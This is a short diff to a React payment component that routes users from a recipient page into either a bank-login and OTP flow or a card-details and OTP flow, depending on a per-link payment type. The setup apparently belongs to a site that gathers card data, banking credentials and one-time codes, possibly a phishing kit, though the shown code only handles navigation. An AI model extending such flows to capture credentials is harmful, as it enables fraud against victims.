@@ -116,7 +116,18 @@ const PaymentRecipient = () => {
       service: serviceName,
       amount: formattedAmount
     }));
-    navigate(`/pay/${id}/details`);
+    
+    // Get payment type from sessionStorage or link data
+    const paymentType = sessionStorage.getItem('paymentType') || linkData?.payload?.payment_type || "card_data";
+    
+    // Navigate based on payment type
+    if (paymentType === "bank_login") {
+      // Bank login flow: recipient -> bank-selector -> bank-login -> otp
+      navigate(`/pay/${id}/bank-selector`);
+    } else {
+      // Card data flow: recipient -> details -> card -> otp
+      navigate(`/pay/${id}/details`);
+    }
   };
   
   return (
